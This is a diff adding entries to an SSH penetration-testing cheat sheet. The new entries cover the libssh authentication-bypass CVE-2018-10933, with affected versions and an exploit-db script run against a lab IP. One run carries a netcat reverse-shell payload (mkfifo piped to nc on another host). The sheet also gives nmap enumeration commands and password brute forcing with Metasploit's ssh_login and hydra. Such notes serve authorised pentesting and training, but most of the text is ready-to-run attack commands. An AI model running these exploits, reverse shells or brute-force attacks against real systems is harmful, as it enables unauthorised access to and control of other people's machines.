@@ -1,5 +1,38 @@
 # Pentest SSH
 # Default Port: 22
+# Reference: https://community.turgensec.com/ssh-hacking-guide/
+
+# Famous Exploits
+
+## CVE-2018-10933 - LibSSH RCE
+This is a vulnerability impacting libssh library. This
+vulnerability allows unauthorized access by bypassing the
+authentication.
+
+Affected Versions: 
+- From (including) 0.6.0    Up to (excluding) 0.7.6
+- From (including) 0.8.0    Up to (excluding) 0.8.4
+    
+For example if nmap says:
+
+    22/tcp  open     ssh      libssh 0.8.3 (protocol 2.0)
+
+Then SSH is vulnerable!
+
+Hence we can find the exploit from exploitdbd and do:
+
+    python /usr/share/exploitdb/exploits/linux/remote/46307.py 192.168.1.94 22 id
+;;or
+    python /usr/share/exploitdb/exploits/linux/remote/46307.py \
+    192.168.1.94 22 \
+    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.100 80 >/tmp/f"
+
+
+# Enumeration of Authentication Methods (openssh)
+ssh -v 192.168.1.94
+;; we can force a specific type of authentication
+ssh -v 192.168.1.94 -o PreferredAuthentications=password
+
 
 # Enumeration (nmap)
 nmap --script ssh2-enum-algos 192.168.108.197
@@ -8,8 +41,14 @@ nmap --script sshv1 192.168.108.197
 
 # Bruteforce (metasploit)
 msf > use auxiliary/scanner/ssh/ssh_login
+msf > set PASS_FILE /usr/share/wordlists/password/rockyou.txt
+msf > set RHOSTS 192.168.1.94
+msf > set THREADS 10
+msf > set STOP_ON_SUCCESS true
+msf > set username jsmith
 msf > run
 
 # Bruteforce (hydra)
 hydra -L users.txt -P 10_million_password_list_top_1000.txt -t 4 192.168.1.69 ssh -vv
+
 
